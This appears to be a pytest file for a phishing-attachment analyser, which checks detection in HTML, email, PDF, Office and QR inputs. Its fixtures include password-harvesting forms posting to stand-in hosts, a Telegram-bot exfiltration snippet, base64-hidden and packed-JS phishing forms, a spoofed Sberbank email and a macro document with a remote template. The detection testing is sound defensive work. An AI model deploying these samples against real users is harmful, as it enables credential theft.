import base64
import json
import os

import pytest

from attachment_parser import AttachmentParser, deobfuscate_payloads, normalize_url, sniff_file_kind
from qr_scanner import scan_qr_codes
from conftest import DATASET_DIR


def test_form_action_is_external_relative_to_page_site():
    html = """<form action="https://exfil-gate.xyz/drop.php" method="post">
                <input type="email" name="email"><input type="password" name="pw"></form>
              <form action="/search"><input name="q"></form>"""
    res = AttachmentParser.parse_html(html, base_url="https://shop.example.com/login")
    drop, search = res["forms"]
    assert drop["is_external"] and drop["has_password"] and drop["action_host"] == "exfil-gate.xyz"
    assert not search["is_external"]
    # same registrable domain is not "external"
    same = AttachmentParser.parse_html('<form action="https://auth.example.com/x"><input type="password"></form>',
                                       base_url="https://www.example.com/")
    assert not same["forms"][0]["is_external"]


def test_html_features_iframes_favicon_redirects_endpoints():
    html = """<html><head><link rel="shortcut icon" href="/f.ico"><meta http-equiv="refresh" content="0; url=https://evil.example/next">
    <script src="https://cdn.example.net/kit.js"></script></head><body>
    <iframe src="https://frame.example.org/x"></iframe>
    <script>fetch("https://collector.example.ru/api", {method:"POST"}); window.location.href = "https://land.example.com/";</script>
    </body></html>"""
    res = AttachmentParser.parse_html(html, base_url="https://page.example.io/a/b")
    assert res["favicon"] == "https://page.example.io/f.ico"
    assert res["meta_refresh"] == "https://evil.example/next"
    assert res["iframes"] == ["https://frame.example.org/x"]
    assert "https://collector.example.ru/api" in res["js_external_endpoints"]
    assert "https://land.example.com/" in res["js_redirects"]
    assert "cdn.example.net" in res["external_resource_hosts"]


def test_telegram_exfiltration_and_bot_id():
    html = """<script>fetch("https://api.telegram.org/bot7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage?chat_id=-100123456&text="+p)</script>
              <input type="password" id="p">"""
    res = AttachmentParser.parse_html(html)
    assert res["has_telegram_exfil"] and res["has_password_field"]
    assert res["telegram_bot_tokens"][0].startswith("7123456789:")
    assert "-100123456" in res["telegram_chat_ids"]


def test_single_atob_is_not_obfuscation_but_packer_is():
    legit = "<script>var cfg = JSON.parse(atob(window.__CFG__));</script>"
    assert AttachmentParser.parse_html(legit)["has_script_obfuscation"] is False
    packed = "<script>eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'a|b'.split('|'),0,{}))</script>"
    assert AttachmentParser.parse_html(packed)["has_script_obfuscation"] is True


def test_base64_hidden_form_is_decoded_and_parsed():
    hidden = '<form action="https://grab.example.top/p.php" method="post"><input type="password" name="p"></form>'
    html = f'<script>document.write(atob("{base64.b64encode(hidden.encode()).decode()}"));</script>'
    res = AttachmentParser.parse_html(html)
    assert res["deobfuscated_layers"] >= 1
    assert res["has_password_field"] is True
    assert res["forms"][0]["action_host"] == "grab.example.top"
    assert "encoded_html_payload" in res["obfuscation_markers"]


def test_hunter_obfuscator_is_decoded():
    # eval(function(h,u,n,t,e,r){...}("<payload>",u,"<alphabet>",offset,base,r)) — encode "<a href='http://x.io'>"
    alphabet, base, offset = "abcdefghij", 7, 11
    plain = "<form action='http://x.io/p'><input type=password></form>"
    chunks = []
    for ch in plain:
        n, digits = ord(ch) + offset, ""
        while n:
            digits = "0123456"[n % base] + digits
            n //= base
        chunks.append("".join(alphabet[int(d)] for d in digits))
    payload = alphabet[base].join(chunks) + alphabet[base]
    js = f'eval(function(h,u,n,t,e,r){{r="";return r}}("{payload}",42,"{alphabet}",{offset},{base},3))'
    decoded = deobfuscate_payloads(js)
    assert decoded and "x.io/p" in decoded[0]


@pytest.mark.parametrize("raw,expected", [
    ("https:/zcase7.info/add/x", "https://zcase7.info/add/x"),
    ("https://https://acesso.a.run.app?x", "https://acesso.a.run.app?x"),
    ("https//evil.com/a", "https://evil.com/a"),
    ("http://ok.com/a.", "http://ok.com/a"),
])
def test_malformed_links_are_repaired(raw, expected):
    assert normalize_url(raw) == expected


def _eml_with_html_attachment() -> bytes:
    att = b'<html><title>Sber</title><form action="https://x.top/p"><input type="password"></form></html>'
    return (
        b"From: =?utf-8?B?0KHQsdC10YDQsdCw0L3Qug==?= <alert@sber-bank-online.top>\n"
        b"Reply-To: helper@mail.ru\nTo: a@b.ru\nSubject: test\nMIME-Version: 1.0\n"
        b'Content-Type: multipart/mixed; boundary="B"\n\n'
        b"--B\nContent-Type: text/html; charset=utf-8\n\n"
        b'<p>See <a href="https:/evil.example/path">https://www.sberbank.ru</a></p>\n'
        b'--B\nContent-Type: text/html; name="doc.pdf.html"\nContent-Disposition: attachment; filename="doc.pdf.html"\n'
        b"Content-Transfer-Encoding: base64\n\n" + base64.encodebytes(att) + b"\n--B--\n"
    )


def test_eml_recursive_attachment_analysis_is_json_safe():
    res = AttachmentParser.parse_eml(_eml_with_html_attachment())
    json.dumps(res)  # no raw bytes in the result
    assert res["from_name"] == "Сбербанк" and res["from_domain"] == "sber-bank-online.top"
    assert res["reply_to_mismatch"] is True
    assert "https://evil.example/path" in res["links"]
    assert res["link_text_mismatch"] and res["link_text_mismatch"][0]["shown"] == "https://www.sberbank.ru"
    item = res["attachments_analysis"][0]
    assert item["kind"] == "html" and item["has_password_field"] is True
    assert res["forms"][0]["action_host"] == "x.top"
    assert res["has_password_field"] is True


def test_sniffing_detects_extensionless_eml_and_html():
    assert sniff_file_kind("0517e90f", _eml_with_html_attachment()) == "eml"
    assert sniff_file_kind("page", b"<!DOCTYPE html><html><body></body></html>") == "html"
    assert sniff_file_kind("x.bin", b"%PDF-1.7 ...") == "pdf"


def test_pdf_links_and_active_content():
    pymupdf = pytest.importorskip("pymupdf")
    doc = pymupdf.open()
    page = doc.new_page()
    page.insert_text((72, 72), "Pay here: https://pay.example-phish.top/invoice")
    page.insert_link({"kind": pymupdf.LINK_URI, "from": pymupdf.Rect(72, 60, 300, 80), "uri": "https://link.example-phish.top/a"})
    data = doc.tobytes()
    res = AttachmentParser.parse_pdf(data)
    assert "https://link.example-phish.top/a" in res["links"]
    assert "https://pay.example-phish.top/invoice" in res["links"]


def test_office_macro_and_remote_template():
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/vbaProject.bin", b"\x00macro")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                   'Target="https://tpl.example-phish.top/t.dotm" TargetMode="External"/></Relationships>')
        z.writestr("word/document.xml", "<w:document>Visit https://doc.example-phish.top/x now</w:document>")
    res = AttachmentParser.parse_office(buf.getvalue(), "invoice.docm")
    assert res["has_vba_macros"] and res["has_remote_template"]
    assert "https://doc.example-phish.top/x" in res["links"]


def test_qr_code_is_decoded():
    cv2 = pytest.importorskip("cv2")
    encoder = cv2.QRCodeEncoder.create()
    img = encoder.encode("https://qr.example-phish.top/login")
    img = cv2.resize(img, None, fx=8, fy=8, interpolation=cv2.INTER_NEAREST)
    img = cv2.copyMakeBorder(img, 40, 40, 40, 40, cv2.BORDER_CONSTANT, value=255)
    ok, png = cv2.imencode(".png", img)
    assert scan_qr_codes(png.tobytes()) == ["https://qr.example-phish.top/login"]


def test_real_dataset_eml_if_available():
    eml_path = os.path.join(DATASET_DIR, "keis2", "Сбер", "0517e90f5805fff01c086cbc6ace8010e0a643e6",
                            "0517e90f5805fff01c086cbc6ace8010e0a643e6")
    if not os.path.exists(eml_path):
        pytest.skip("Dataset not available")
    with open(eml_path, "rb") as f:
        res = AttachmentParser.parse_eml(f.read())
    assert res["from_address"] == "kevin@nova.gy" and res["from_domain"] == "nova.gy"
    assert res["reply_to_domain"] == "mail.ru"
